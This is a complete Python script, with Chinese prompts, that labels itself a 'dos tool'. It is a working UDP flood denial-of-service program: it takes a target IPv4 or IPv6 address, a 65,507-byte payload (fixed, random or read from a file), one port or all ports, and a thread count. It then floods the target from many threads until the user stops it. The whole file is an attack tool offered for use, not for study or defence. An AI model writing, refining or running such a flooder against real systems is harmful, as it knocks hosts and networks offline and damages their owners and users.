from socket import socket , AF_INET , AF_INET6 , SOCK_DGRAM
from threading import Thread
from os import system , name
from secrets import token_bytes
from os.path import getsize
from time import sleep

condition = True

def is_valid_ipv4_ipv6(ip , ip_mode):
    if ip_mode == "1":
        parts = ip.split(".")
        if len(parts)!= 4:
            return False
        for part in parts:
            try:
                num = int(part)
                if num < 0 or num > 255:
                    return False
            except:
                return False
        return True
    elif ip_mode == "2":
        parts = ip.split(":")
        if len(parts) > 8:
            return False
        valid_chars = set("0123456789abcdefABCDEF")
        for part in parts:
            if len(part) > 4:
                return False
            for char in part:
                if char not in valid_chars:
                    return False
        return True

if name == "nt":
    def clear_shell():
        system("cls")
else:
    def clear_shell():
        system("clear")

clear_shell()
print("""
Python3  dos工具

作者          : WindowsKin""")
while True:
    ip_mode = input("""
1.IPv4
2.IPv6
请输入 IP 协议类型 : """)
    if ip_mode == "1":
        sock = socket(AF_INET , SOCK_DGRAM)
    elif ip_mode == "2":
        sock = socket(AF_INET6 , SOCK_DGRAM)
    else:
        print("检测到你输入了无效内容，请重新输入")
        sleep(2)
        continue
    break
while True:
    ip = input("请输入 IP : ")
    if not is_valid_ipv4_ipv6(ip , ip_mode):
        print("检测到你输入了无效内容，请重新输入")
        sleep(2)
        continue
    break
bytes_mode = input("""
1.使用默认数据包
2.使用随机生成的数据包
3.使用指定二进制文件当作数据包
请选择数据包获取方式 : """)
if bytes_mode == "1":
    bytes = bytes([0xFF] * 65507)
elif bytes_mode == "2":
    bytes = token_bytes(65507)
elif bytes_mode == "3":
    while True:
        try:
            bytes_path = input("请输入文件路径 : ")
            if getsize(bytes_path) > 65507:
                print("检测到你输入的文件大于65507字节，请重新输入")
                sleep(2)
                continue
            elif getsize(bytes_path) == 0:
                print("检测到你输入了空文件，请重新输入")
                sleep(2)
                continue
            with open(bytes_path , "rb") as b:
                bytes = b.read()
        except FileNotFoundError:
             print("没有找到该文件，请重新输入")
             sleep(2)
             continue
        except PermissionError:
             print("没有权限读取该文件，请检查权限后重新输入")
             sleep(2)
             continue
        except OSError as e:
             print(f"读取文件时出现其他错误: {e}，请重新输入")
             sleep(2)
             continue
        break
else:
    print('检测到你输入了无效内容，已以为你选择默认值"1"')
    sleep(2)
    bytes = bytes([0xFF] * 65507)
mode = input("""
1.攻击指定端口
2.攻击所有端口
请选择攻击方式 : """)
if mode == "1":
    while True:
        try:
            port = int(input("请输入 端口 : "))
            if port > 65535 or port < 0:
                print("检测到你输入了无效内容，请重新输入")
                sleep(2)
                continue
        except ValueError:
            print("检测到你输入了无效内容，请重新输入")
            sleep(2)
        else:
            break
elif mode != "2":
    print('检测到你输入了无效内容，已以为你选择默认值"2"')
    sleep(2)
    mode = "2"
try:
    sc = int(input("请输入 线程数量(不能为0) : "))
    if sc == 0:
        print('检测到你输入了无效内容，已以为你选择默认值"1"')
        sleep(2)
        sc = 1
except ValueError:
    print('检测到你输入了无效内容，已以为你选择默认值"1"')
    sleep(2)
    sc = 1
clear_shell()

if mode == "1":
    print(f"已选攻击方式 {mode} 进行攻击\n攻击程序正在攻击 {ip} {port} 端口")
elif mode == "2":
    print(f"已选攻击方式 {mode} 进行攻击\n攻击程序正在攻击 {ip}")

def dos_1(bytes , ip , port):
    global condition
    while condition:
        try:
            sock.sendto(bytes , (ip , port))
        except:
            pass

def dos_2(bytes , ip):
    global condition
    port = 4444
    while condition:
        try:
            sock.sendto(bytes , (ip , port))
            if port == 65535:
                port = 0
            else:
                port += 1
        except:
            pass

if mode == "1":
    for i in range(sc):
        dos_sc = Thread(target = dos_1 , args = (bytes , ip , port))
        dos_sc.start()
elif mode == "2":
    for i in range(sc):
        dos_sc = Thread(target = dos_2 , args = (bytes , ip))
        dos_sc.start()

input("按Enter键停止攻击")
condition = False